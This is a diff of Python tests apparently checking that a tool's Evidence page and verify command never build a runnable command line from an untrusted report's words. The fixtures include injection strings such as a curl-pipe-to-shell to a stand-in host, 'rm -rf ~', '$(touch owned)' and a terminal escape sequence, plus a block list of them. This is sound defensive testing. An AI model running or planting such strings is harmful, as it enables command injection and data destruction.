@@ -166,3 +166,89 @@ def test_the_verify_command_installs_the_lantern_that_made_the_report(monkeypatc
     assert evidence.engine_ref() == sha
     monkeypatch.setattr(_build, "COMMIT", "not a commit")
     assert re.fullmatch(r"[0-9a-f]{40}|v[\w.-]+", evidence.engine_ref())
+
+
+# ---------------------------------------------------------------- a command to run is never made of a report's words
+# The Evidence page is rebuilt from `evidence.json`, which lies in the project's folder and may be anybody's. What the
+# page shows of it is escaped. The line a reader is told to copy and run was built from it too (2026-11-15): the
+# commit as the report wrote it, and the tests' command as the report wrote it, joined with spaces.
+WORDS = ["python", "-m", "pytest; curl https://example.invalid/x | sh", "$(touch owned)", "`id`", "a\nrm -rf ~",
+         "\x1b]0;a title\x07", "&& echo done"]
+NOT_TO_RUN = ("curl https", "$(touch", "`id`", "rm -rf", "echo done", "\x1b", "\n")
+
+
+def _copied(page: str) -> str:
+    """The text the page's "Copy verify command" button puts on the clipboard."""
+    mark = "getElementById('copyverify'), cmd = "
+    return json.JSONDecoder().raw_decode(page, page.index(mark) + len(mark))[0]
+
+
+def _shown(page: str) -> str:
+    """The line the page shows to be run, as a reader sees it."""
+    import html
+    mark = "Re-running the open-source analyzer"
+    code = page[page.index("<code>", page.index(mark)) + len("<code>"):]
+    return html.unescape(code[:code.index("</code>")])
+
+
+def test_the_line_to_copy_holds_nothing_a_report_wrote(tmp_path):
+    repo = _repo(tmp_path)
+    assert main(["analyze", str(repo)]) == 0
+    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
+    commit = ev["header"]["commit"]
+    page = evidence.render_html(ev)
+    line = _copied(page)
+    assert line.startswith(f"git checkout {commit[:12]} && pip install ") and _shown(page) == line
+    assert line.endswith(" && lantern verify . --report evidence.html")
+    # the tests' command as a report tells it: shown, word by word, and not part of the line
+    ev["payload"]["run"]["trace"] = WORDS
+    page = evidence.render_html(ev)
+    assert _copied(page) == line and _shown(page) == line       # before: ` -- ` and the report's words after it
+    assert not any(bad in _copied(page) for bad in NOT_TO_RUN)
+    assert evidence.E(json.dumps(WORDS)) in page and "type it yourself" in page
+    # the commit as a report tells it: only what a commit's name can be goes into the line
+    for said in ("0123abc; curl https://example.invalid/x | sh #", "$(touch owned)", "main", commit[:11] + "\n", 7,
+                 ["x"], {"a": 1}):
+        ev["header"]["commit"] = said
+        page = evidence.render_html(ev)
+        assert _copied(page) == _shown(page) == evidence.NO_COMMIT_LINE, said
+        assert not any(bad in _copied(page) for bad in NOT_TO_RUN)
+    # the twin: a commit's whole name in the newer form is one too
+    ev["header"]["commit"] = "ab" * 32
+    assert _copied(evidence.render_html(ev)).startswith("git checkout abababababab && pip install ")
+
+
+def test_a_reports_test_command_is_shown_as_what_the_report_says(tmp_path, capsys):
+    """An honest report made with a test run: the page and `lantern verify` say which command the report names,
+    each word on its own, and the person types it. Typed, it verifies as before."""
+    repo = _repo(tmp_path)
+    cmd = [sys.executable, "app.py"]
+    assert main(["analyze", str(repo), "--trace", "--", *cmd]) == 0
+    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
+    page = (repo / ".lantern/evidence.html").read_text(encoding="utf-8")
+    assert _copied(page).endswith(" && lantern verify . --report evidence.html")
+    assert evidence.E(json.dumps(cmd)) in page and "type it yourself" in page
+    assert evidence.words_shown(cmd) == json.dumps(cmd)
+    rep = str(repo / ".lantern/evidence.json")
+    capsys.readouterr()
+    assert main(["verify", str(repo), "--report", rep]) == 2
+    err = capsys.readouterr().err
+    assert json.dumps(cmd) in err and " -- " + " ".join(cmd) not in err   # before: a line ready to paste
+    assert main(["verify", str(repo), "--report", rep, "--", *cmd]) == 0
+    # a report that names other words: nothing of them reaches the terminal as it was written
+    ev["payload"]["run"]["trace"] = WORDS
+    planted = repo / ".lantern" / "planted.json"
+    planted.write_text(json.dumps(ev), encoding="utf-8")
+    capsys.readouterr()
+    assert main(["verify", str(repo), "--report", str(planted)]) == 2
+    err = capsys.readouterr().err
+    assert json.dumps(WORDS) in err and "\x1b" not in err and "a\nrm -rf" not in err
+    assert " -- python -m pytest; curl" not in err
+
+
+def test_many_words_or_long_ones_are_cut_short_and_said():
+    assert evidence.words_shown(["python", "-m", "pytest"]) == '["python", "-m", "pytest"]'
+    assert evidence.words_shown([]) == "" and evidence.words_shown("python -m pytest") == ""
+    long = evidence.words_shown(["x" * 5000, 3, None, {"a": 1}] + ["y"] * 500)
+    assert len(long) <= evidence.WORDS_SHOWN + 40 and long.endswith(" (cut short)")
+    assert "\x07" not in evidence.words_shown(["a\x07b"]) and "\\u0007" in evidence.words_shown(["a\x07b"])
